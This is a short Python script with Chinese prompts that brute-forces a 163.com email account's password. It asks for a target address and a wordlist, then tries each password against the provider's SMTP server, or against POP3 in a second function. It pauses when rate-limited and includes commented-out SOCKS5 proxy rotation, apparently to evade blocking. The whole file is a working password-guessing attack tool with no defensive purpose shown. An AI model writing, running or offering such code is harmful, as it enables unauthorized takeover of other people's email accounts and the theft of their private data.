import smtplib
from mysql_cont import MysqlConnt
import socks, socket
import random
import sys
import time
import poplib
username = input('请输入邮箱地址:')
pwdict = input('输入密码字典路径:')
# iplist = MysqlConnt().getip()

# def change_ip():
#     ip = random.choice(iplist)
#     ip_address = ip['ip']
#     ip_port = int(ip['port'])
#     print ('现在使用的ip为',ip)
#     socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,ip_address, ip_port)
#     socket.socket = socks.socksocket
def mailpassword():
    host = 'smtp.163.com'
    with open(pwdict, 'r') as f:
        for lines in f.readlines():
            password = lines.strip()
            try:
                server = smtplib.SMTP(host,25)
                auth = server.login(username,password)
                print('密码已找到',password)
                sys.exit(1)
            except smtplib.SMTPAuthenticationError as e:
    # #535, b'Error: authentication failed' 这个是密码错误
                print(password,"密码错误，尝试下一个")
            except smtplib.SMTPConnectError as e:
                print('连接过多，一会重连')
                time.sleep(60)



def mail_pop3():
    host = 'pop3.163.com'
    with open(pwdict, 'r') as f:
        for lines in f.readlines():
            password = lines.strip()
            try:
                pop = poplib.POP3(host)
                pop.set_debuglevel(1)
                pop.user(username)
                auth = pop.pass_(password)
                if auth.split(' ')[0] == '+OK':
                    print('密码已找到', password)
                    sys.exit(1)
            except Exception as e:
                #535, b'Error: authentication failed' 这个是密码错误
                print(password,"密码错误，尝试下一个")
                time.sleep(2)

if __name__ == '__main__':
    # change_ip()
    mailpassword()
    # mail_pop3()

